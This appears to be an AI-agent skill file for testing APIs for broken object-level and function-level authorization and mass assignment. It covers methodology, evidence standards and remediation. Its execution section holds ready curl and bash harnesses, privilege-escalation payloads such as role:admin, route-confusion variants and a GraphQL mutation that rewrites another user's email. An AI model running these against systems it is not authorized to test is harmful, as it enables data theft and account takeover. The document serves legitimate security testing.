---
name: api-authorization-and-bola
description: >-
  API authorization and BOLA/BFLA testing playbook. Use when APIs expose object
  identifiers, nested resources, hidden writable fields, or weak function-level
  authorization. Covers the two-account differential loop, identifier discovery
  beyond the URL path, method and route confusion, mass assignment, and the
  evidence required to report an authorization gap as a finding.
---

# SKILL: API Authorization and BOLA — Object Access, Function Access, and Mass Assignment

> **AI LOAD INSTRUCTION**: BOLA is the single most common serious API vulnerability and the
> most commonly mis-reported one. The reason is that **authorization is per-object and
> per-function, not per-endpoint** — so `GET /api/orders/123` returning 200 for the wrong
> user is only a finding once you have proven the object belongs to someone else. A 200 on
> an ID you guessed is not the finding; a 200 on an ID you *created as a different user* is.
> The entire discipline is building that proof. Establish two identities, capture the object
> ID as one, replay as the other, and show both the create and the cross-read.
> **Never report an IDOR from a single account.**

## 0. RELATED ROUTING

- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) — endpoint and schema discovery that feeds this skill
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — token and claim layer above object authz
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) — the non-API shape of the same class
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — systematic cross-account sweep methodology
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) — object IDs inside GraphQL arguments
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — when the boundary fails before authorization
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — how the differential proof is presented

---

## 1. THE TWO-ACCOUNT DIFFERENTIAL — THE ONLY RELIABLE METHOD

Everything in this skill reduces to one loop. Build it once, reuse it for every object class.

```
IDENTITY A (victim)  — creates and owns the object
IDENTITY B (attacker) — same role, different user, NO relationship to the object
IDENTITY C (optional) — higher privilege (admin), to separate BOLA from BFLA
```

| Step | Action | What you are establishing |
|---|---|---|
| 1 | As **A**, create the object through the normal UI/API | the object's true owner |
| 2 | Capture the identifier **A** received | the ID you will replay |
| 3 | As **B**, replay the same request with the same ID | the authorization decision under test |
| 4 | Compare B's response to A's response | differential = the proof |
| 5 | Repeat with no auth, and with a tampered token | boundary completeness |

**Same-role accounts only for BOLA.** If B is an admin and succeeds, you have found BFLA or
privilege escalation, not BOLA — a different finding with a different severity. Keep the
roles straight or the report will be wrong.

| Response to B | Meaning | Report as |
|---|---|---|
| `200` + full object body identical to A's | cross-tenant object read | **BOLA — high** |
| `200` with the object *field-filtered* | partial authz — still a leak | BOLA, note the filtered fields |
| `403` / `404` | correctly enforced | not a finding |
| `200` with empty/placeholder body | enforced but leaky by shape | information disclosure, low |
| `500` / stack trace | enforcement exists but fails unsafely | error disclosure, medium |

**A `404` where `403` was expected is usually correct behaviour** — it avoids confirming the
object exists. Do not report 404 as a bypass.

**Test the write verbs, not just read.** The read path is the one developers test. The update
and delete paths are where the gap lives:

```
GET    /api/v1/orders/123        → often enforced
PUT    /api/v1/orders/123        → frequently not
PATCH  /api/v1/orders/123        → frequently not
DELETE /api/v1/orders/123        → frequently not
```

A confirmed cross-tenant `DELETE` or `PUT` is **critical**, not high — it is integrity loss,
not confidentiality loss.

---

## 2. FINDING THE IDENTIFIER — IT IS RARELY JUST THE PATH

The classic test is `/api/orders/123` → `/api/orders/124`. Real systems put the identifier in
places that fuzzing the path never reaches. Enumerate all of them before deciding authz is solid.

| Location | Example | Why it is missed |
|---|---|---|
| path segment | `/api/orders/123` | the obvious one — everyone tests it |
| nested path | `/api/users/1/invoices/9` | parent checked, child not |
| query parameter | `?order_id=123` | developer checks path, forgets query |
| request body | `{"orderId":"123"}` | no path ID at all |
| JSON nested object | `{"filter":{"userId":"1"}}` | buried one level down |
| header | `X-Order-Id: 123`, `X-Tenant: victim` | never fuzzed |
| cookie | `order_ref=123` | treated as opaque session data |
| GraphQL argument | `order(id:"123")` | leaves the REST mental model |
| multipart field | `Content-Disposition: ...; name="order_id"` | upload paths |
| base64 / encoded blob | `eyJvcmRlcl9pZCI6MTIzfQ==` | the ID is inside, but lookups skip it |

**Decode every opaque value before concluding it is not an ID.** Base64, hex, and
UUID-v5-shaped strings frequently carry the tenant or user key. A token that decodes to
`{"tenant":1,"user":5}` is a BOLA surface, and it is one of the most commonly missed.

**Identifier quality drives exploitability, which drives severity:**

| Type | Example | Enumerable? | Realistic severity |
|---|---|---|---|
| sequential integer | `123` | yes, trivially | high — mass exploitation possible |
| low-entropy short ID | `a7f3` | yes, brute-forceable | high |
| UUIDv4 | `9f8e…` | no | medium — targeted, needs the ID from elsewhere |
| UUIDv1 / timestamp-based | `9f8e-1f2a-…` | partially | medium-high |
| signed / HMAC'd ID | `123.hmac` | no, unless the key leaks | low — designed correctly |
| hashids with known salt | `abc` | yes if salt is guessable | high |

**A sequential ID is the difference between "one victim" and "the whole database."** State
the identifier type explicitly in the report — it sets the real-world impact.

---

## 3. BFLA — FUNCTION-LEVEL AUTHORIZATION

BOLA is *which object*; BFLA is *which action*. Different bug, different fix, tested separately.

**Route guessing against a known working prefix.** The admin surface usually mirrors the user
surface:

```
/api/v1/users/me           → known working
/api/v1/users              → collection (often admin-only listing)
/api/v1/admin/users        → admin namespace
/api/v1/internal/users     → internal namespace
/api/v1/users/me/role      → self-service vs admin field
```

**Method confusion on the same route.** Many frameworks carry one handler's authorization to
the whole route:

```
GET    /api/v1/users/me     → user's own data (allowed)
POST   /api/v1/users/me     → create/update (authz often absent)
PUT    /api/v1/users/me     → full replace — can set fields the PATCH handler blocks
PATCH  /api/v1/users/me     → partial update
DELETE /api/v1/users/me     → rarely intended
OPTIONS /api/v1/users/me    → reveals the allowlist; free intel
HEAD   /api/v1/users/me     → same authz as GET but sometimes skipped
```

**Verb tampering tests the *route*, not the role.** Send a low-privilege identity against
verbs the UI never calls. A `PUT` that reaches an update path the `POST` handler guards is a
finding; the fact that it was "not in the UI" is the vulnerability, not a caveat.

**Trailing-slash and case confusion** — proxy rules and framework routers frequently disagree:

```
/api/v1/admin/users   → 403
/api/v1/admin/users/  → 200   (different route match in some frameworks)
/api/v1/Admin/users   → 200
/api/v1//admin/users  → 200
/api/v1/admin/users/.  → 200
/api/v1/admin/users%00 → 200 (null byte, some stacks)
```

This is enumeration, not injection: you are looking for **two different code paths that
should share one authorization decision.**

---

## 4. MASS ASSIGNMENT — THE FIELD NOBODY AUTHORIZED

The endpoint is authorized. The *field* is not. Your identity B does not need to touch
anyone else's object — B grants itself privilege on its own object.

**Step 1 — extract the full field set from the create/read responses.** The response is the
schema you were not given:

```http
GET /api/v1/users/me
{"id":5,"email":"b@x.com","role":"user","org_id":9,"verified":false,
 "plan":"free","tier":1,"credits":0,"is_admin":false}
```

**Step 2 — replay the write with the privileged fields added.** Field names come from
observing admins, from GraphQL type definitions, from mobile bundles, and from the response
above:

```json
{"email":"b@x.com","role":"admin"}
{"email":"b@x.com","is_admin":true}
{"email":"b@x.com","org_id":1}
{"email":"b@x.com","verified":true}
{"email":"b@x.com","plan":"enterprise"}
{"email":"b@x.com","credits":999999}
{"email":"b@x.com","tier":9}
{"email":"b@x.com","permissions":["*"]}
{"email":"b@x.com","owner_id":5}
```

**Step 3 — read back and confirm persistence.** The write returning 200 proves nothing. The
read-back is the proof. A field that is silently ignored is not vulnerable.

| Variant | Why it works |
|---|---|
| nested object | `{"user":{"role":"admin"}}` — traverses into a different binder |
| camel/snake mix | `{"role":"admin","role_id":1,"roleId":1}` — one lands |
| array wrap | `{"role":["admin"]}` — type confusion in the binder |
| JSON duplicate key | `{"role":"user","role":"admin"}` — parser takes the last |
| content-type swap | same body as `application/x-www-form-urlencoded` |
| form-encoded | `role=admin&role=user` — parameter pollution |

**The last three are the ones testers skip.** A duplicate JSON key and a form-body
content-type swap reach binder code that the JSON path never touches.

---

## 5. THE DIFFERENTIAL PROOF — WHAT MAKES IT A FINDING

An authorization finding lives or dies on the quality of the two responses you show. Collect
all of it at capture time; you cannot reconstruct it later.

| Evidence item | Why |
|---|---|
| **Identity A's create request + response** | proves A owns the object |
| **Identity A's own read of the object** | the baseline body |
| **Identity B's request** — full headers, including B's token | proves B is a *different, same-role* user |
| **Identity B's response** — status and full body | the authz failure |
| **Annotated diff** of A's read vs B's read | the single most convincing artefact |
| the object identifier and its type (sequential/UUID) | establishes exploitable scale |
| the verb that failed (GET/PUT/DELETE) | read vs write changes severity |
| proof B has no relationship to the object or its owner | rules out legitimate sharing |

**The diff is the finding.** Two full response bodies side by side, identical except for the
token used, is unarguable. A screenshot of a 200 is not.

**False positives to exclude before reporting:**

| Looks like a finding | Actually |
|---|---|
| A and B are in the same organisation by design | shared tenancy, not BOLA |
| the object is explicitly public/shareable | intended access |
| A's token works because B *is* A (same session) | you reused the wrong session |
| the ID returns public reference data (a country list) | not an object |
| 200 with an error body | check the body, not the status code |
| B is a superuser in the test environment | wrong account setup |
| the "victim" object was created by B earlier | state confusion |

**Bookmark this one: always confirm B did not create the object.** In long test sessions it is
easy to replay against an object B owns, get a 200, and report a BOLA that does not exist.
Read A's create response again before you write the finding.

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| both identities, their roles, and proof of difference | the test is meaningless without it |
| A's create request/response and A's read | establishes ownership and baseline |
| B's request and response, full and unredacted | the failing authorization decision |
| annotated diff of the two responses | the primary proof |
| identifier type and enumerability | converts a single hit into a scale estimate |
| verb tested and whether the write persisted | read vs write severity |
| a negative control (a correctly enforced sibling object) | proves you can detect enforcement |
| whether the issue reproduces after a fresh session | rules out caching and state artefacts |

**The negative control is not optional.** Without one correctly-403ing object in the same
report, the reader cannot tell whether you tested enforcement or simply never hit it.

---

## 7. REMEDIATION REFERENCE

1. **Authorize at the object, every time** — resolve the object, then verify the authenticated subject owns it or holds an explicit grant. Do not infer ownership from "the route looked user-scoped."
2. **Centralize the check in the data layer** — a per-object check in middleware, ORM scope, or a policy engine (OPA, Casbin, Laravel policies) applied by default. Per-handler checks are how gaps appear; every new endpoint becomes a coin flip.
3. **Deny by default on verbs** — allowlist the methods each route supports; return 405 for the rest. Method confusion disappears when undefined verbs cannot reach a handler.
4. **Bind only writable fields explicitly** — use DTOs / typed serializers with an allowlist. Never pass a request body directly into model binding; that *is* mass assignment, regardless of framework.
5. **Never trust a client-supplied tenant, role, or owner field** — derive it from the session, and ignore the body when it contradicts the session.
6. **Use non-enumerable identifiers for externally visible objects** — UUIDv4 or a signed ID. Sequential integers make a single bug into a full-database incident.
7. **Test the write paths in CI** — an automated two-account differential test against PUT/PATCH/DELETE on the top ten object types catches regressions that no unit test will.
8. **Log and alert on cross-tenant access** — an authenticated subject requesting an object outside their scope is a high-signal detection; it is almost never legitimate traffic.

---

## 8. EXECUTION PRIMITIVES

BOLA is proven by a **two-account differential**: two accounts, different owners, and data crossing
between them. Every block below produces that comparison explicitly.

### 8.1 The two-account harness

```bash
A_RT="TOKEN_FOR_USER_A"; A_ID="1001"; A_RES="1001"
B_RT="TOKEN_FOR_USER_B"; B_ID="1002"; B_RES="1002"
T="https://api.target.tld"
# account B reads its own resource - the baseline that must work
curl -sS -o /tmp/b_own  -w 'B->B (own)  %{http_code} %{size_download}\n' "$T/api/users/$B_RES" -H "Authorization: Bearer $B_RT"
# account B reads A's resource - the differential
curl -sS -o /tmp/b_a    -w 'B->A        %{http_code} %{size_download}\n' "$T/api/users/$A_RES" -H "Authorization: Bearer $B_RT"
# account A reads A's resource - proves the resource exists and is populated
curl -sS -o /tmp/a_own  -w 'A->A (own)  %{http_code} %{size_download}\n' "$T/api/users/$A_RES" -H "Authorization: Bearer $A_RT"
diff <(head -c 300 /tmp/b_a) <(head -c 300 /tmp/a_own) >/dev/null && echo "DATA CROSSES ACCOUNTS" || echo "difference - inspect"
```

**`B->A` returning `200` with A's data, where `B->B` works and `A->A` works, is the finding.** Print all
three responses; the third one is what proves the resource had data to leak.

### 8.2 Enumerate every identifier position

```bash
# the id is rarely only in the path
P="$T/api/users"
echo "--- path";       curl -sS -o /tmp/1 -w '%{http_code} %{size_download}\n' "$P/$A_RES" -H "Authorization: Bearer $B_RT"
echo "--- query";      curl -sS -o /tmp/2 -w '%{http_code} %{size_download}\n' "$P?id=$A_RES" -H "Authorization: Bearer $B_RT"
echo "--- body form";  curl -sS -o /tmp/3 -w '%{http_code} %{size_download}\n' -X POST "$P/get" --data-urlencode "id=$A_RES" -H "Authorization: Bearer $B_RT"
echo "--- body json";  curl -sS -o /tmp/4 -w '%{http_code} %{size_download}\n' -X POST "$P/get" -H 'Content-Type: application/json' -H "Authorization: Bearer $B_RT" -d "{\"id\":\"$A_RES\"}"
echo "--- header";     curl -sS -o /tmp/5 -w '%{http_code} %{size_download}\n' "$P" -H "X-User-Id: $A_RES" -H "Authorization: Bearer $B_RT"
echo "--- nested";     curl -sS -o /tmp/6 -w '%{http_code} %{size_download}\n' "$T/api/orgs/$A_ID/users" -H "Authorization: Bearer $B_RT"
echo "--- mutating";   curl -sS -o /tmp/7 -w '%{http_code} %{size_download}\n' -X PATCH "$P/$A_RES" -H 'Content-Type: application/json' -H "Authorization: Bearer $B_RT" -d '{"name":"bola-test"}'
cat /tmp/1 /tmp/2 /tmp/3 /tmp/4 /tmp/5 /tmp/6 | grep -c '@' 
```

The identifier appears in the path, the query, the body, a header, or a nested route - **test each one,
because the guard is often only on the path**. The last line counts `@` signs as a crude indicator of
leaked email addresses; inspect the bodies rather than trusting the count.

### 8.3 Identifier formats and enumeration

```bash
# numeric ids are the easy case; the hard ones are UUIDs, base64, and hashes
for V in "$A_RES" "$(printf '%s' "$A_RES" | base64)" "$(printf '%s' "$A_RES" | md5sum | cut -d' ' -f1)" \
         "0" "-1" "999999" "1e3" "1.0" "%2e%2e%2f$A_RES" ; do
  R=$(curl -sS -o /tmp/id -w '%{http_code} %{size_download}' "$T/api/users/$V" -H "Authorization: Bearer $B_RT")
  printf '%-34s %s\n' "$V" "$R"
done
```

UUIDs are not guessable but are **frequently disclosed elsewhere** in the same API - a list endpoint,
an error message, an email, a shared link. If a UUID is leaked anywhere B can read, the object is
reachable and the finding stands.

### 8.4 Harvest identifiers from every endpoint B can reach

```bash
# B's own accessible endpoints are the best source of other users' identifiers
for E in /api/me /api/feed /api/comments /api/notifications /api/messages /api/shared \
         /api/team /api/activity /api/search?q=a /api/users; do
  R=$(curl -sS -o /tmp/h -w '%{http_code} %{size_download}' "$T$E" -H "Authorization: Bearer $B_RT")
  printf '%-34s %s\n' "$E" "$R"
  grep -oE '\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b|\b[0-9]{4,}\b' /tmp/h | sort -u | head -4
done
```

This is the technique that makes UUID-protected BOLA exploitable: **the identifier is not secret if
any endpoint reveals it**. Collect the list, then test B against each.

### 8.5 BFLA - function-level authorization with the same differential

```bash
# B attempts administrative functions
for M in GET POST PUT PATCH DELETE; do
  for E in /api/admin/users /api/admin/settings /api/admin/audit /api/users/$A_RES/role \
           /api/internal/metrics /api/admin/export; do
    R=$(curl -sS -o /tmp/f -w '%{http_code} %{size_download}' -X "$M" "$T$E" \
          -H "Authorization: Bearer $B_RT" -H 'Content-Type: application/json' -d '{}')
    case "$R" in 2*|3*) printf 'HIT %-6s %-34s %s\n' "$M" "$E" "$R";; esac
  done
done
```

Any non-`401`/`403` for an administrative function is worth inspecting. **A `200` on a privileged
function is BFLA** - confirm the body contains administrative data or that the action took effect.

### 8.6 Mass assignment through the same request

```bash
# B reads its own profile, then writes back extra fields
curl -sS -o /tmp/me "$T/api/me" -H "Authorization: Bearer $B_RT"
python3 - <<'PY'
import json
d=json.load(open('/tmp/me'))
print("own fields:", sorted(d.keys())[:20])
PY
# add privileged fields to the update and check whether they persist
curl -sS -o /tmp/ma -w 'mass-assign %{http_code}\n' -X PATCH "$T/api/me" \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $B_RT" \
  -d '{"displayName":"normal","role":"admin","isAdmin":true,"verified":true,"balance":999999,"tenantId":"VICTIM_TENANT"}'
curl -sS -o /tmp/me2 "$T/api/me" -H "Authorization: Bearer $B_RT"
diff <(python3 -c "import json;print(sorted(json.load(open('/tmp/me')).items()))") \
     <(python3 -c "import json;print(sorted(json.load(open('/tmp/me2')).items()))") | head -20
```

**The diff after the write is the proof** - a field that changed and that you were not authorized to set
is mass assignment, and `role` or `tenantId` changing is a privilege escalation. Always re-`GET` the
object; the `200` response alone does not prove persistence.

### 8.7 GraphQL and non-REST forms of the same gap

```bash
# GraphQL: B requests an object it does not own, via a query and via a mutation
curl -sS -o /tmp/g1 -w 'gql-query %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $B_RT" \
  -d "{\"query\":\"query{ user(id:\\\"$A_RES\\\"){ id email role } }\"}"
head -c 200 /tmp/g1; echo
curl -sS -o /tmp/g2 -w 'gql-mut   %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $B_RT" \
  -d "{\"query\":\"mutation{ updateUser(id:\\\"$A_RES\\\", input:{email:\\\"pwn@YOUR_DOMAIN\\\"}){ id email } }\"}"
head -c 200 /tmp/g2
```

GraphQL frequently implements authorization in the resolver for the top-level field but not for the
node it returns. **A query returning A's data to B is the same finding**, reported in the schema's
terms.

### 8.8 Prove the write took effect, not just the response

```bash
# for a mutating BOLA, read the object back with A's token
curl -sS -o /tmp/wrote -w 'as B: write %{http_code}\n' -X PATCH "$T/api/users/$A_RES" \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $B_RT" -d '{"nickname":"bola-proof"}'
sleep 1
curl -sS -o /tmp/readback -w 'as A: read  %{http_code}\n' "$T/api/users/$A_RES" -H "Authorization: Bearer $A_RT"
grep -c 'bola-proof' /tmp/readback
echo "1 means the write persisted and is visible to the owner - that is a confirmed mutating BOLA"
```

**Reading it back with the owner's token is the proof of a write.** A `200` on the PATCH is not enough -
the field may have been silently dropped, which is itself worth noting but is not the finding.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does **B's own request work** (`B->B`)? | your harness is correct |
| 2 | Does **A's own request work** (`A->A`) and return populated data? | the resource exists and has something to leak |
| 3 | Does **`B->A` return `200` with A's data**? | the BOLA |
| 4 | Did you test a **different admin-context** where applicable? | BOLA is object-level, not role-level; the admin case is separate |
| 5 | For a write: does the change **persist and appear to the owner**? | a mutating BOLA, the stronger finding |
| 6 | Is the identifier **disclosed anywhere B can read**? | determines whether a UUID-protected object is exploitable |
| 7 | Does the same gap affect **more than one object type**? | a systemic authorization gap rather than a single bug |

**The three-way response comparison is the finding.** Never report BOLA from a single `200` - the
`A->A` control is what proves the data was another user's.

---

## 10. EVIDENCE STANDARD — THE THREE-RESPONSE DIFFERENTIAL

| Item | Why |
|---|---|
| **Three responses** - `B->B`, `A->A`, `B->A` - with status, size, and body | the differential is the entire proof |
| The **exact request** including the identifier's position (path, query, body, header) | reproducible, and it names the fix location |
| The **identifier value and format**, and where B obtained it | a UUID from a leak is still a finding, and the leak is part of it |
| The **leaked fields** - which of A's data crossed the boundary | impact: a name is not the same as a token or an address |
| For a write: the **write request, the read-back as the owner, and the persisted value** | a mutating BOLA needs both halves |
| For BFLA: the **privileged function**, the response, and the effect | function-level escalation |
| For mass assignment: the **before/after object diff** showing the field changed | persistence, not a response echo |
| **Negative control** - a request for a truly non-existent object returns `404` | shows the endpoint distinguishes existence, so the `200` is meaningful |
| The **account roles** involved, documented with their legitimate entitlements | proves the access was unauthorized |
| Confirmation that no **other user's data was modified** except for the single controlled write | scope discipline |

Report the **differential**: "with user B's token, `GET /api/users/1002` returns B's own profile and
`GET /api/users/1001` returns `200` with user A's full profile including email and phone, identical to
the response A receives with its own token; the endpoint's path-based ownership check compares the
requesting user only for `/api/me`, not for `/api/users/{id}`; the same gap affects `/api/orders/{id}`
and `/api/documents/{id}`", never "the API has an IDOR vulnerability".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` for an object that turns out to be **your own** | no boundary crossed |
| A `200` with an empty body or a stub | no data crossed |
| A `403`/`401` on B's attempt | the control works |
| A `200` returning data that is **public by design** (a public profile) | intended access |
| An object id you guessed that does not exist, with a `200` empty envelope | not a leak |
| A response identical for every id (a generic template) | no object-level access |
| A `200` because you sent **A's token by mistake** | your harness error |
| A `200` where the object belongs to a shared team both users are in | legitimately shared |
| A write whose field appears in the response but not in the read-back | not persisted |
| A "mass assignment" of a field that is not security-relevant and was already settable | no privilege change |
| A test performed with an **admin token** | not a broken-object finding |
| A finding on a staging environment you were not authorized to test | scope violation |

**Print all three responses.** The single most common error in this domain is reporting a `200` without
confirming the data belonged to someone else.

---

## 11. REMEDIATION REFERENCE — AUTHORIZATION DESIGN

1. **Authorize the object, not the endpoint** - every request that names an object must verify that the caller is permitted to act on that specific object, which is what a route-level guard cannot do.
2. **Use a single authorization function called from every data access path** - a central `can(user, action, object)` check removes the per-endpoint gaps that produce most BOLA findings.
3. **Scope every query by the caller's identity at the data layer** - `WHERE user_id = :currentUser` on every read, rather than a filter applied in the controller, makes the boundary structural.
4. **Do not rely on unguessable identifiers as authorization** - UUIDs are frequently disclosed through list endpoints, logs, and emails, so an unguessable id is defence in depth, never a control.
5. **Deny access to non-existent and unauthorized objects identically** - returning `404` rather than `403` avoids a secondary enumeration oracle.
6. **Validate mass assignment with an explicit allowlist per role** - never bind a request body directly to a model; an allowed-field list is the control that stops `role` and `tenantId` from being set by the user.
7. **Apply the same authorization to mutations, bulk endpoints, and exports** - writes, batch operations, and CSV exports are the paths most often missed while the single-object read is guarded.
8. **Implement field-level authorization, not just object-level** - returning an object does not mean returning every field on it, and BOPLA is the class that follows BOLA in most reports.
9. **Test with two real accounts in CI, for every endpoint** - an automated two-account differential suite is the only reliable detector and the only reliable regression guard.
10. **Log authorization decisions with the object and the principal** - when a BOLA is found, the log is what determines how long it was exploitable.
11. **Include GraphQL resolvers, REST controllers, and background jobs in the authorization review** - a schema's node resolver is a data access path, and jobs that act on user-supplied ids are the same class.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the web-application form of the same gap
- [401-403-bypass-techniques](../401-403-bypass-techniques/SKILL.md) - the route-level bypass that complements object-level gaps
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) - the GraphQL resolver form
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - the token layer beneath the authorization decision
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - the endpoint inventory this testing requires
